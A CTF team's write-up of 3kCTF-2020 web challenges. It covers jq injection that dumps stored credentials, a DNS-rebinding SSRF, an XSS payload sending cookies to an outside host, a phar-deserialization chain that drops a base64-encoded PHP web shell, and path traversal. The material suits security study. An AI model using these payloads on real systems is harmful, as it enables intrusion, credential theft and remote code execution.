select(.address|contains(\"[ADDR]\")) | .[FILTER]' test.json Read along the documentation of jq, we have experimented around:\n .search fprintf 0 |$maindb|keys|{id:.[]} Found: id\tlibcDB Found: id\tusers .search fprintf 0 |$maindb.users[]|keys|{id:.[]} Found: id\tpassword Found: id\tusername .search fprintf 0 |$maindb.users[]|{id:.username,symbol:.password} Found: id\t3k symbol\tnotaflag Found: id\tJames symbol\tHetfield Found: id\tLars symbol\tUlrich Found: id\tDead symbol\tpool Found: id\tadmin symbol\tv3ryL0ngPwC4nTgu3SS0xfff Found: id\tjim symbol\tcarrey Okay. Great, we have the credentials of the admin. Connecting to the service again, and this time we are signing in with it.\n$ nc libcdb.3k.ctf.to 7777 Login  admin Password  v3ryL0ngPwC4nTgu3SS0xfff Authenticated {\"users\":{\"username\":\"admin\",\"password\":\"v3ryL0ngPwC4nTgu3SS0xfff\"}} __ _ _ ____ _____ | | |_| |_ ___| \\| __ | | |__| | . | _| | | __ -| |_____|_|___|___|____/|_____| as a service Type .help for help  .secret 3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}  DNS rebinding from Wikipedia [return] The Perm Jam 2: The Camel Strikes Back - @na7irub [return]   ",
  "wordCount" : "4153",
  "inLanguage": "en",
  "datePublished": "2020-07-28T11:36:00+08:00",
  "dateModified": "2020-07-28T11:36:00+08:00",
  "author":[{
    "@type": "Person",
    "name": "apple"
  }, {
    "@type": "Person",
    "name": "cire meat pop"
  }, {
    "@type": "Person",
    "name": "eriri"
  }, {
    "@type": "Person",
    "name": "Mystiz"
  }, {
    "@type": "Person",
    "name": "ozetta"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://b6a.black/posts/2020-07-28-3kctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Black Bauhinia",
    "logo": {
      "@type": "ImageObject",
      "url": "https://b6a.black/favicon.ico"
    }
  }
}
</script>



</head>

<body class=" dark" id="top">
<noscript>
    <style type="text/css">
        .theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
            <span class="logo-switches">
                
                
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://b6a.black/about-us/" title="About Us">
                    <span>About Us</span>
                </a>
            </li></ul>
    </nav>
</header>

    <main class="main">

<article class="post-single">
  <header class="post-header">

    <h1 class="post-title">
      3kCTF-2020 Writeup
    </h1>
    <div class="post-meta">

July 28, 2020&nbsp;·&nbsp;apple, cire meat pop, eriri, Mystiz, ozetta

</div>
  </header>
  
  
  <div class="post-content">
<h2 id="reporter-web-498-points">reporter (Web; 498 points)<a hidden class="anchor" aria-hidden="true" href="#reporter-web-498-points">#</a></h2>

<p>Solved by <em>apple</em>.</p>

<p>Author: rekter0</p>

<blockquote>
<p>Reporter is an online markdown reporting tool.
it's free to use for everyone.
there's a secret report we need located <a href="http://reporter.3k.ctf.to/secret_report">here</a></p>

<p><a href="https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src">source</a></p>
</blockquote>

<h3 id="walkthrough">Walkthrough<a hidden class="anchor" aria-hidden="true" href="#walkthrough">#</a></h3>

<p>The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.</p>

<p>There are 4 buttons on the interface: <code>Edit</code>, <code>Preview</code>, <code>Save</code>, and <code>Deliver</code>.</p>

<p>The first target of the challenge is to access the <code>secret_report</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">curl http://reporter.3k.ctf.to/secret_report
<span style="color:#75715e">&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">title</span>&gt;403 Forbidden&lt;/<span style="color:#f92672">title</span>&gt;
...</code></pre></div>
<p>Well, knew that.</p>

<h4 id="exploiting-toctou-of-the-domain-checking">Exploiting TOCTOU of the domain checking<a hidden class="anchor" aria-hidden="true" href="#exploiting-toctou-of-the-domain-checking">#</a></h4>

<p>Interesting things happen in <a href="https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src/backend.php">backend.php</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if(@$_POST[&#39;deliver&#39;]){
	$thisDoc=file_get_contents($dir.&#39;/file.html&#39;);
	$images = preg_match_all(&#34;/&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;(.*?)\&#34;</span> <span style="color:#960050;background-color:#1e0010">/&#34;,</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">thisDoc</span><span style="color:#960050;background-color:#1e0010">,</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">matches</span><span style="color:#960050;background-color:#1e0010">);</span>
	<span style="color:#a6e22e">foreach</span> <span style="color:#960050;background-color:#1e0010">($</span><span style="color:#a6e22e">matches</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">]</span> <span style="color:#a6e22e">as</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">key </span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&gt; </span><span style="color:#e6db74">$value)</span> <span style="color:#960050;background-color:#1e0010">{</span>
		<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">thisDoc </span><span style="color:#f92672">=</span> <span style="color:#e6db74">str_replace($value</span> <span style="color:#960050;background-color:#1e0010">,</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">data:image</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">png</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">base64</span><span style="color:#960050;background-color:#1e0010">,&#34;.</span><span style="color:#a6e22e">base64_encode</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">fetch_remote_file</span><span style="color:#960050;background-color:#1e0010">($</span><span style="color:#a6e22e">value</span><span style="color:#960050;background-color:#1e0010">))</span> <span style="color:#960050;background-color:#1e0010">,</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">thisDoc</span> <span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">;</span>
  <span style="color:#960050;background-color:#1e0010">}</span></code></pre></div>
<p>When user click on the <code>deliver</code> button it will get the saved document, <code>fetch_remote_file</code> and embed it to the report with <code>base64</code>. Therefore users can embed images from external image hosting sites such as imgur etc.</p>

<p>How about embedding the <code>secret_report</code>? It does not work as it do a long list of checks:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function fetch_remote_file($url) {
    $config[&#39;disallowed_remote_hosts&#39;] = array(&#39;localhost&#39;);
    $config[&#39;disallowed_remote_addresses&#39;] = array(&#34;0.0.0.0/8&#34;, &#34;10.0.0.0/8&#34;, &#34;100.64.0.0/10&#34;, &#34;127.0.0.0/8&#34;, &#34;169.254.0.0/16&#34;, &#34;172.16.0.0/12&#34;, &#34;192.0.0.0/29&#34;, &#34;192.0.2.0/24&#34;, &#34;192.88.99.0/24&#34;, &#34;192.168.0.0/16&#34;, &#34;198.18.0.0/15&#34;, &#34;198.51.100.0/24&#34;, &#34;203.0.113.0/24&#34;, &#34;224.0.0.0/4&#34;, &#34;240.0.0.0/4&#34;,);

    // ...

    $addresses = get_ip_by_hostname($url_components[&#39;host&#39;]);
    $destination_address = $addresses[0];

    // ... checks if the destination_address is in the disallowed list ...

    $opts = array(&#39;http&#39; =&gt; array(&#39;follow_location&#39; =&gt; 0,));
    $context = stream_context_create($opts);
    return file_get_contents($url, false, $context);
}
function get_ip_by_hostname($hostname) {
    $addresses = @gethostbynamel($hostname);
    if (!$addresses) {
      // ... more attempts to get dns A records ...
    }
    return $addresses;
}</code></pre></div>
<p>If we change the DNS record very quickly, which the DNS server return <code>1.1.1.1</code> at <code>get_ip_by_hostname</code> when it do the checking, and we return <code>127.0.0.1</code> at <code>file_get_contents</code> we can access the <code>localhost</code> and maybe we can get the <code>secret_report</code>.</p>

<p>Therefore I wrote a <a href="https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/dnsrebind.js">script</a><sup class="footnote-ref" id="fnref:dns-rebind"><a class="footnote" href="#fn:dns-rebind">1</a></sup> to act as a nameserver and give different responses.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dig +short 4kctf.example.com @8.8.8.8
1.1.1.1
$ dig +short 4kctf.example.com @8.8.8.8
127.0.0.1</code></pre></div>
<p>payload</p>
<pre><code>![](http://4kctf.example.com/secret_report/)</code></pre>
<p>The result is a file listing with two files:</p>
<pre><code>3ac45ca05705d39ed27d7baa8b70ecd560b69902.php
secret2

63b4bacc828939706ea2a84822a4505efa73ee3e.php
not much here</code></pre>
<p>The <code>3ac45ca05705d39ed27d7baa8b70ecd560b69902.php</code> is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.</p>

<h4 id="wonders-of-php-empty0--true">Wonders of PHP: empty(&quot;0&quot;) == true<a hidden class="anchor" aria-hidden="true" href="#wonders-of-php-empty0--true">#</a></h4>

<p>I crafted this payload to read the file and get the flag.</p>
<pre><code>![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php)</code></pre>
<p>Back to the <code>backend.php</code> <code>fetch_remote_file</code>, besides DNS checking it also <code>parse_url</code> and checks <code>scheme</code>, <code>port</code>, etc.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function fetch_remote_file($url) {
    // ...
    $url_components = @parse_url($url);
    if (!isset($url_components[&#39;scheme&#39;])) {
        return false;
    }
    if (@($url_components[&#39;port&#39;])) {
        return false;
    }
    if (!$url_components) {
        return false;
    }
    if ((!empty($url_components[&#39;scheme&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> !in_array($url_components[&#39;scheme&#39;], array(&#39;http&#39;, &#39;https&#39;)))) {
        return false;
    }
    if (array_key_exists(&#34;user&#34;, $url_components) || array_key_exists(&#34;pass&#34;, $url_components)) {
        return false;
    }
    // ...
    return file_get_contents($url, false, $context);</code></pre></div>
<p><code>parse_url</code> will parse as follows</p>
<pre><code>array(2) {
  [&#34;scheme&#34;]=&gt;
  string(1) &#34;0&#34;
  [&#34;path&#34;]=&gt;
  string(62) &#34;/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php&#34;
}</code></pre>
<p>Where the <code>scheme</code> will return <code>true</code> for <code>isset</code> and <code>true</code> for <code>empty</code> (<code>empty(&quot;0&quot;) == true</code>), and for <code>file_get_contents</code> it will recognize <code>0:</code> as a folder and <code>0:/../</code> as current folder.</p>

<h2 id="xsser-web-499-points">xsser (Web; 499 points)<a hidden class="anchor" aria-hidden="true" href="#xsser-web-499-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<h3 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h3>

<blockquote>
<p>challenge</p>

<p>Author: Dali</p>
</blockquote>

<h3 id="walkthrough-1">Walkthrough<a hidden class="anchor" aria-hidden="true" href="#walkthrough-1">#</a></h3>

<p>Source code is provided:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>

{
    <span style="color:#66d9ef">public</span> $name;
    <span style="color:#66d9ef">public</span> $isAdmin;
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($nam)
    {
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> $nam;
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isAdmin</span><span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>;
    }
}

<span style="color:#a6e22e">ob_start</span>();
<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;login&#39;</span>]))){
    $use<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#e6db74">&#39;guest&#39;</span>);
    $log<span style="color:#f92672">=</span><span style="color:#a6e22e">serialize</span>($use);
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: ?login=</span><span style="color:#e6db74">$log</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">exit</span>();

}

$new_name<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;new&#39;</span>];
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($new_name)){


  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">stripos</span>($new_name, <span style="color:#e6db74">&#39;script&#39;</span>))<span style="color:#75715e">//no xss :p 
</span><span style="color:#75715e"></span>                 { 
                    $new_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlentities</span>($new_name);
                 }
        $new_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($new_name, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">32</span>);
  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;h1 style=&#34;text-align:center&#34;&gt;Error! Your msg &#39;</span><span style="color:#f92672">.</span>$new_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/h1&gt;&lt;br&gt;&#39;</span>;
  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;h1&gt;Contact admin /req.php &lt;/h1&gt;&#39;</span>;

}
 <span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>){
            <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#34;session&#34;</span>, $flag, <span style="color:#a6e22e">time</span>() <span style="color:#f92672">+</span> <span style="color:#ae81ff">3600</span>);
        }
$check<span style="color:#f92672">=</span><span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">substr</span>($_GET[<span style="color:#e6db74">&#39;login&#39;</span>],<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">56</span>));
<span style="color:#66d9ef">if</span> ($check<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isAdmin</span>){
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;welcome back admin &#39;</span>;
}
<span style="color:#a6e22e">ob_end_clean</span>();
<span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</code></pre></div>
<p>From the challenge name it is about XSS. After setting <code>$_GET['login']</code>, you can enter something in <code>$_GET['new']</code>, which is supposed to be reflected on the page for XSS.</p>

<p>Thanks to <code>ob_start();</code> and <code>ob_end_clean();</code>, nothing about the user input are printed in the normal case.</p>

<p>To address this, we can make the interpreter panic before <code>ob_end_clean();</code>.  Maybe <code>unserialize</code> could do so?</p>

<p>But most of the time <code>unserialize</code> just returns FALSE when you input some garbage that is &quot;un-unserialize-able&quot; (pun intended)</p>

<p>Let's try to unserialize some meaningful junks:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">foreach</span> (<span style="color:#a6e22e">get_declared_classes</span>() <span style="color:#66d9ef">as</span> $c) {
	<span style="color:#a6e22e">unserialize</span>(<span style="color:#e6db74">&#39;O:&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">strlen</span>($c)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;:&#34;&#39;</span><span style="color:#f92672">.</span>$c<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;:0:{}&#39;</span>);
}
</code></pre></div>
<p>It shows <code>Fatal error: Uncaught Error: Invalid serialization data for DateTime object</code>. So <code>DateTime</code> should do the trick.</p>

<p>How about the actual XSS payload? We can't use <code>&lt;script src=//blah&gt;&lt;/script&gt;</code>.</p>

<p>For some reason <code>script&lt;script src=//blah&gt;&lt;/script&gt;</code> could bypass that <code>stripos</code> but it is too long.</p>

<p>Later on I found that <code>/req.php</code> accepts external URLs as well. So we can use some other tricks like <code>window.name</code>:</p>
<pre><code>&lt;script&gt;name=&#39;location=&#34;//blah/&#34;+document.cookie&#39;;location=&#39;//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E&amp;login=O:8:%22DateTime%22:0:%7B%7D&#39;;&lt;/script&gt;</code></pre>
<h3 id="remarks">Remarks<a hidden class="anchor" aria-hidden="true" href="#remarks">#</a></h3>

<p>At first I tried the payload with iframe but Chrome blocks the <code>Set-Cookie</code> header due to &quot;third-party cookies preference&quot;.</p>

<p>Then I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.</p>

<h2 id="image-uploader-web-498-points">image uploader (Web; 498 points)<a hidden class="anchor" aria-hidden="true" href="#image-uploader-web-498-points">#</a></h2>

<p>Solved by <em>ozetta</em>.</p>

<h3 id="description-1">Description<a hidden class="anchor" aria-hidden="true" href="#description-1">#</a></h3>

<blockquote>
<p>challenge</p>

<p>source</p>

<p>Author: Dali</p>
</blockquote>

<h3 id="題解-walkthrough">題解 (Walkthrough)<a hidden class="anchor" aria-hidden="true" href="#題解-walkthrough">#</a></h3>

<p>我知你睇唔明廣東話架啦. 今次有翻譯.</p>

<blockquote>
<p>I know you don't understand Cantonese. This time got translation.</p>
</blockquote>

<p>個 description 得兩條<a href="https://www.google.com/search?q=goodsmile+5678">奸笑5678</a>. 是但啦有醬油有計傾.</p>

<blockquote>
<p>(Some unimportant gibberish)</p>
</blockquote>

<p>一開 <code>index.php</code> 就見到 <code>include('old.php');//todo remove this useless file :\</code></p>

<blockquote>
<p>After opening <code>index.php</code> then we can see that include stuff...</p>
</blockquote>

<p>明眼人一睇就知係伏啦. 一睇兩個 Class 重唔係玩 unserialize.</p>

<blockquote>
<p>Obviously it is the vulnerable point. It contains 2 classes so obviously it is about unserialize.</p>
</blockquote>

<p>碌落 D (唔好譯啦你譯唔到個 D 架啦) 個 index.php 見到 file_get_contents. 條件反射 phar unserialize</p>

<blockquote>
<p>Scroll down [Don't translate that &quot;D&quot;, you can't] that index.php, we can see <code>file_get_contents</code>. It immediately links to phar unserialize</p>
</blockquote>

<p>有個 <code>upload.php</code> 真係可以 upload 野. 不過會 check <code>getimagesize</code> 同 <code>image/jpeg</code></p>

<blockquote>
<p>There is an <code>upload.php</code> that can really upload things. But it checks with <code>getimagesize</code> and <code>image/jpeg</code>.</p>
</blockquote>

<p>睇返個 <code>old.php</code>, 又係驗眼嘅時間. 最底有個 <code>$data = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code> 但係無咩用.</p>

<blockquote>
<p>Let's go back to <code>old.php</code> and check our eyesight. The bottom <code>$data = &quot;&lt;?php...</code> looks interesting but unless.</p>
</blockquote>

<p>除非個 <code>sprintf('%012d', $expire)</code> 可以整走個 <code>exit()</code> 啦.</p>

<blockquote>
<p>Unless <code>sprintf('%012d', $expire)</code> could be used to get rid of that <code>exit()</code>.</p>
</blockquote>

<p>再碌上 D 見到個詭異嘅 variable function <code>return $serialize($data);</code>. 咁開心.</p>

<blockquote>
<p>Scroll up a bit then we can see a weird variable function <code>return $serialize($data);</code>. So exciting.</p>
</blockquote>

<p>所以如果將 <code>$this-&gt;options['serialize']</code> 改做 <code>system</code> 就可以行 <code>system</code>.</p>

<blockquote>
<p>So if we set <code>$this-&gt;options['serialize']</code> to <code>system</code> then we could run <code>system</code>.</p>
</blockquote>

<p>但係個 <code>$data</code> 要點砌呢. 根據所謂 POP 可以 trace 到:</p>

<blockquote>
<p>But how can we control <code>$data</code>? According to the so-called Property-Oriented Programming, you can trace like this:</p>
</blockquote>

<p><code>$this-&gt;options['serialize']($data) //cl2-&gt;serialize</code></p>

<p>=&gt; <code>$this-&gt;serialize($value) //cl2-&gt;set</code></p>

<p>=&gt; <code>$this-&gt;store-&gt;set($this-&gt;key, $this-&gt;getForStorage(), $this-&gt;expire); //cl1-&gt;save</code></p>

<p>=&gt; <code>return json_encode([$this-&gt;cleanContents($this-&gt;cache), $this-&gt;complete]); //cl1-&gt;getForStorage()</code></p>

<p>首先個 <code>$data</code> 有少少限制. 因為係 <code>json_encode</code> 個 Array.</p>

<blockquote>
<p>First, the <code>$data</code> is a bit restricted. Because it is constructed by <code>json_encode</code>-ing an array.</p>
</blockquote>

<p>不過你想用 <code>system</code> 行 command 其實可以好求其. 好似咩 <code>$(ls)</code>.</p>

<blockquote>
<p>But if you just need to use <code>system</code> to execute command, it is pretty flexible. Like using <code>$(ls)</code>.</p>
</blockquote>

<p>最後可以砌到好似 <code>system('[&quot;$(ls)&quot;,0]')</code>.</p>

<blockquote>
<p>At the end of the day we should be able to construct like <code>system('[&quot;$(ls)&quot;,0]')</code>.</p>
</blockquote>

<p>要 trigger <code>cl1-&gt;save</code>, destructor 個 <code>$this-&gt;autosave</code> 要 false.</p>

<blockquote>
<p>If you want to trigger <code>cl1-&gt;save</code>, in the destructor, <code>$this-&gt;autosave</code> should be false.</p>
</blockquote>

<p>依家有齊啲餡啦. 要搵返 phar 個 payload.</p>

<blockquote>
<p>We are cooking with gas. Now we need to get the phar payload.</p>
</blockquote>

<p>邊鬼個會記得點寫. 抄返自己個威噏.</p>

<blockquote>
<p>Who the heck will remember how to write the payload. Just copy my own write-up.</p>
</blockquote>

<p><a href="https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine">https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine</a>)</p>

<p>由 <code>$p = new Phar('malware.phar');</code> 果行抄起 (好似係)</p>

<blockquote>
<p>Copy the payload starting from <code>$p = new Phar('malware.phar');</code></p>
</blockquote>

<p>上面記得抄返個 Class definition 同埋改晒 D property 佢.</p>

<blockquote>
<p>Remember to copy the class definitions and change the properties to the desired one.</p>
</blockquote>

<p>個 <code>getimagesize</code> 同 <code>image/jpeg</code> 點算? 求其攝個 jpg 向頭咪得囉.</p>

<blockquote>
<p>How to tackle <code>getimagesize</code> and <code>image/jpeg</code>? Just inject a jpg file in front.</p>
</blockquote>

<hr>

<h2 id="final-payload">Final payload<a hidden class="anchor" aria-hidden="true" href="#final-payload">#</a></h2>
<pre><code>&lt;?php

class cl1 {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = &#39;flysystem&#39;, $expire = null) {
        $this-&gt;key = $key;
        $this-&gt;store = $store;
        $this-&gt;expire = $expire;
        //add your own properties
        $this-&gt;cache = [&#39;$(echo PD89YCRfR0VUWzBdYDs= | base64 -d &gt; /var/www/html/up/z.php)&#39;];
        $this-&gt;autosave = 0;
        $this-&gt;complete = 0;
    }
}

class cl2 {
    public function __construct(){
    	//add your own properties
    	$this-&gt;options[&#39;serialize&#39;] = &#34;system&#34;;
    	$this-&gt;writeTimes = 0;
     	$this-&gt;options[&#39;prefix&#39;] = &#39;&#39;;
     	$this-&gt;options[&#39;data_compress&#39;] = 0;
    }
}

$x = new cl1(new cl2(),&#34;z&#34;,0);
$p = new Phar(&#39;malware.phar&#39;);
$p-&gt;startBuffering();
$p-&gt;addFromString(&#34;z&#34;,&#34;&#34;);
$j = file_get_contents(&#34;1.jpg&#34;);
$p-&gt;setStub($j.&#34;&lt;?php __HALT_COMPILER(); ? &gt;&#34;);
$p-&gt;setMetadata($x);
$p-&gt;stopBuffering();
$file = file(&#39;malware.phar&#39;);</code></pre>
<hr>

<p>之後 upload 個「圖」, 出返個 &quot;filename.jpg&quot;. 之後讀 <code>php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename</code>.</p>

<blockquote>
<p>Then upload that &quot;image&quot;, will return &quot;filename.jpg&quot;. Then access <code>php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename</code>.</p>
</blockquote>

<p>之後點玩自己諗啦. 提示: 估下 <code>PD89YCRfR0VUWzBdYDs=</code> 係咩先.</p>

<blockquote>
<p>The rest is left as an exercise for the readers. (Hint: decode <code>PD89YCRfR0VUWzBdYDs=</code>)</p>
</blockquote>

<h2 id="remark">Remark<a hidden class="anchor" aria-hidden="true" href="#remark">#</a></h2>

<p><figure><img src="/images/2020-07-28-3kctf/image-uploader-troIl.png" alt=""></figure></p>

<p><del>呢題咁易都搞咗我個半鐘真係失敗。</del></p>

<p><figure><img src="/images/2020-07-28-3kctf/image-uploader-trolI.png" alt=""></figure></p>

<p><a href="https://twitter.com/confus3r/status/1286850105513930752">https://twitter.com/confus3r/status/1286850105513930752</a></p>

<p>慘。早啲起身咪有 First Blood (好似係</p>

<h2 id="carthagods-web-496-points">carthagods (Web; 496 points)<a hidden class="anchor" aria-hidden="true" href="#carthagods-web-496-points">#</a></h2>

<p>Author: rekter0, Dali</p>

<blockquote>
<p>Salute the carthagods!</p>

<p>Hints</p>

<ol>
<li><a href="https://github.com/rinlo/ctf-writeups/tree/master/2020/3kCTF-2020/carthagods/src">redacted source</a></li>
</ol>
</blockquote>

<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>

<p>The challenge provided the redacted sourcecode as hints.</p>

<p>.htaccess</p>
<pre><code>...
RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA]</code></pre>
<p>index.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">...
<span style="color:#75715e">&lt;?php</span>
  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">@</span>$_GET[<span style="color:#f92672">*</span><span style="color:#a6e22e">REDACTED</span><span style="color:#f92672">*</span>]){
    $file<span style="color:#f92672">=</span>$_GET[<span style="color:#f92672">*</span><span style="color:#a6e22e">REDACTED</span><span style="color:#f92672">*</span>];
    $f<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;thecarthagods/&#39;</span><span style="color:#f92672">.</span>$file);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/&lt;\?php/i&#34;</span>, $f)){
        <span style="color:#66d9ef">echo</span> $f;
    }<span style="color:#66d9ef">else</span>{
      <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;php content detected&#39;</span>;
    }
  }
<span style="color:#75715e">?&gt;</span>
...
</code></pre></div>
<p>The php script accepts user provided <code>$file</code> path without any sanitation, however the GET parameter is redacted.</p>

<p>The <code>.htaccess</code> file rewrite the path to index.php with the GET parameter. Lets try the folder <code>thecarthagods</code> as shown in the php file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://carthagods.3k.ctf.to:8039/thecarthagods</code></pre></div>
<p>We got the token</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">title</span>&gt;301 Moved Permanently&lt;/<span style="color:#f92672">title</span>&gt;
&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;
&lt;<span style="color:#f92672">h1</span>&gt;Moved Permanently&lt;/<span style="color:#f92672">h1</span>&gt;
&lt;<span style="color:#f92672">p</span>&gt;The document has moved &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods&#34;</span>&gt;here&lt;/<span style="color:#f92672">a</span>&gt;.&lt;/<span style="color:#f92672">p</span>&gt;
&lt;<span style="color:#f92672">hr</span>&gt;
&lt;<span style="color:#f92672">address</span>&gt;Apache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039&lt;/<span style="color:#f92672">address</span>&gt;
&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;</code></pre></div>
<p>With the token we can do path traversal</p>
